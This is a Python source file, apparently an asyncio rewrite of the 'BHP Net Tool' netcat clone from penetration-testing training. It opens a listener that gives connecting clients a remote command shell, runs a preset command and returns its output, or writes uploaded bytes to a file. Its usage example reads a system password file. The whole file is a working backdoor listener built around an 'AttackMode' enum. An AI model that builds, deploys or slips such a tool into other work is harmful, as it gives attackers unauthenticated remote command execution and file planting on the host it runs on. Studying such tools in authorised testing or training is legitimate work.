import asyncio
import argparse
import shlex
from enum import Enum
import textwrap


class AttackMode(Enum):
    EXECUTE = "execute"
    SHELL = "shell"
    UPLOAD = "upload"

    @classmethod
    def enum_type(cls, value: str):
        try:
            return cls[value.upper()]
        except KeyError:
            raise argparse.ArgumentError() # noqa


class AsyncNetCat:

    def __init__(
            self,
            address: str,
            port: str,
            mode: AttackMode,
            command: list[str] = None,
            filename: str = None
    ):
        self.address = address
        self.port = port
        self.mode = mode
        self.command = command
        self.filename = filename

    def __repr__(self):
        return f"{self.__class__.__name__}(address={self.address!r}, port={self.port!r}, mode={self.mode!r})"

    async def run(self):
        server = await asyncio.start_server(
            self.handle, self.address, self.port
        )

        addrs = ", ".join(str(sock.getsockname()) for sock in server.sockets)
        print(f"Serving on {addrs} with mode: {self.mode}")

        try:
            await server.serve_forever()
        except KeyboardInterrupt:
            server.close()

    async def handle(
            self,
            reader: asyncio.StreamReader,
            writer: asyncio.StreamWriter,
    ):
        match self.mode:
            case AttackMode.EXECUTE:
                await self.execute(writer)
            case AttackMode.SHELL:
                await self.shell(reader, writer)
            case AttackMode.UPLOAD:
                await self.upload(reader, writer)
            case _:
                raise NotImplementedError()

    @staticmethod
    async def execute_shell(cmd: str):
        cmd = shlex.split(cmd)
        if not cmd:
            return None, None
        proc = await asyncio.create_subprocess_shell(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        return stdout, stderr

    async def shell(
            self,
            reader: asyncio.StreamReader,
            writer: asyncio.StreamWriter
    ):
        try:
            while True:
                writer.write(b'[SHELL]> ')
                await writer.drain()
                command = await reader.read(64)
                if not command or command == b'\n':
                    break
                stdout, stderr = await self.execute_shell(command.decode())
                if stdout:
                    writer.write(f"[stdout]\n{stdout.decode()}".encode())
                    await writer.drain()
                if stderr:
                    writer.write(f"[stderr]\n{stderr.decode()}".encode())
                    await writer.drain()
        finally:
            writer.close()
            await writer.wait_closed()

    async def execute(
            self,
            writer: asyncio.StreamWriter
    ):
        try:
            proc = await asyncio.create_subprocess_exec(
                *self.command,
                stdout=asyncio.subprocess.PIPE,
            )
            data = await proc.stdout.read()
            writer.write(data)
            await writer.drain()
            await proc.wait()
        finally:
            writer.close()
            await writer.wait_closed()

    async def upload(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        try:
            file_buffer = b''
            while True:
                data = await reader.read(4096)
                if not data or data == b'\n':
                    break
                file_buffer += data
            if file_buffer:
                with open(self.filename, "wb") as file:
                    file.write(file_buffer)
                message = f"file write to {self.filename}\r\n"
                writer.write(message.encode())
                await writer.drain()
        finally:
            writer.close()
            await writer.wait_closed()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="BHP Net Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
            netcat.py -t 192.168.1.108 -p 5555 shell # command shell
            netcat.py -t 192.168.1.108 -p 5555 execute -c cat /etc/pwd # execute a command.
            ''')
    )
    # Top-level parser
    parser.add_argument('-t', '--target', default='192.168.1.48', help='specified IP')
    parser.add_argument('-p', '--port', default=5555, type=int, help='specified Port')
    parser.set_defaults(mode=AttackMode.SHELL)
    parser.set_defaults(command=None)
    parser.set_defaults(filename=None)

    subparsers = parser.add_subparsers()

    shell_parser = subparsers.add_parser('shell', help='Return a shell')
    shell_parser.set_defaults(mode=AttackMode.SHELL)

    execute_parser = subparsers.add_parser('execute')
    execute_parser.add_argument("-c", "--command", nargs='+', required=True)
    execute_parser.set_defaults(mode=AttackMode.EXECUTE)

    upload_parser = subparsers.add_parser("upload")
    upload_parser.add_argument('-f', "--filename", required=True)
    upload_parser.set_defaults(mode=AttackMode.UPLOAD)

    args = parser.parse_args()
    nc = AsyncNetCat(args.target, args.port, args.mode, args.command, args.filename)
    asyncio.run(nc.run())
